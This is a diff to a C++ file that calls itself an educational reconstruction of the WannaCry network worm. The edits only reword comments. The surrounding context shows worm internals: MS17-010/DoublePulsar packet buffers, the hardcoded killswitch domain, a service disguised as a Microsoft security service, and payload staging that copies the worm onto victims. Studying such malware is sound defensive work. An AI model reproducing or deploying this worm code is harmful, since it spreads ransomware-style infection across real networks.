@@ -1,6 +1,8 @@
-/* worm.cpp — annotated educational reconstruction of the WannaCry worm (mssecsvc.exe).
- * Exploit wire bytes are inert reference data. Killswitch, service persistence,
- * payload-drop chain, dual-lane spreader and MS17-010 orchestration explained inline. */
+// worm.cpp — the WannaCry network worm (mssecsvc.exe)
+// Killswitch domain check, service persistence, payload-drop chain and the
+// dual-lane MS17-010 spreader; the exploit wire bytes are inert reference
+// data.
+// Reconstructed from the 2017 WannaCry binary (educational).
 
 #if !defined(WIN32_LEAN_AND_MEAN)
 # define WIN32_LEAN_AND_MEAN
@@ -59,8 +61,8 @@ static BYTE g_pkt_negotiate[88];        /* 88 B: SMB Negotiate request          
 static BYTE g_pkt_sesssetup[103];       /* 103 B: Session Setup AndX                   */
 static BYTE g_pkt_treeconn[0x61];       /* 97 B: Tree Connect AndX                     */
 static BYTE g_pkt_echo[78];             /* 78 B: Trans2 probe to \PIPE\                */
-static BYTE g_pkt_sesssetup2[137];      /* 137 B: DoublePulsar session setup #1        */
-static BYTE g_pkt_sesssetup3[140];      /* 140 B: DoublePulsar session setup #2        */
+static BYTE g_pkt_sesssetup2[137];      /* 137 B: DoublePulsar session setup, first  */
+static BYTE g_pkt_sesssetup3[140];      /* 140 B: DoublePulsar session setup, second */
 static BYTE g_pkt_echo96[96];           /* 96 B: DoublePulsar session echo             */
 static BYTE g_pkt_dp_ping[82];          /* 82 B: DoublePulsar Trans2 ping              */
 static BYTE g_groom_hdr[70];            /* 70 B: groom/overflow SMB template           */
@@ -84,7 +86,7 @@ enum {
 static const char *KILLSWITCH_URL =
     "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";   /* the killswitch domain */
 
-#define SERVICE_NAME     "mssecsvc2.0"  /* fixed name the worm installs itself under */
+#define SERVICE_NAME     "mssecsvc2.0"  /* fixed name the network worm installs itself under */
 #define SERVICE_DISPLAY  "Microsoft Security Center (2.0) Service" /* fake display name */
 #define SERVICE_ARGS_FMT "%s -m security" /* SCM launch line: selects service mode    */
 #define DROP_DIR         "WINDOWS"      /* payload lands in C:\WINDOWS               */
@@ -907,8 +909,8 @@ static unsigned __stdcall random_ip_scanner_thread(void *arg)
  *   buffer 0 (x86): 16,480-B DoublePulsar user-mode loader + [4-B size][own EXE]
  *   buffer 1 (x64): 51,364-B loader + the same [size][EXE] tail
  * On the victim the DoublePulsar loader writes the appended EXE to
- * C:\WINDOWS\mssecsvc.exe and starts its service — the worm installs a copy
- * of itself, closing the self-replication loop. */
+ * C:\WINDOWS\mssecsvc.exe and starts its service — the network worm installs
+ * a copy of itself, closing the self-replication loop. */
 static int stage_injection_payloads(void)
 {
     HANDLE hFile;
@@ -994,7 +996,7 @@ static void start_spreader(void)
  * 6. Killswitch / service / payload drop
  * ========================================================================= */
 
-/* The program's real main. Killswitch: at startup the worm contacts a
+/* The program's real main. Killswitch: at startup the network worm contacts a
  * hardcoded domain; if the domain answers at all — any HTTP response, from
  * a proxy, captive portal or sinkhole counts — the worm exits without
  * infecting. If the domain is unreachable, infection proceeds. The original
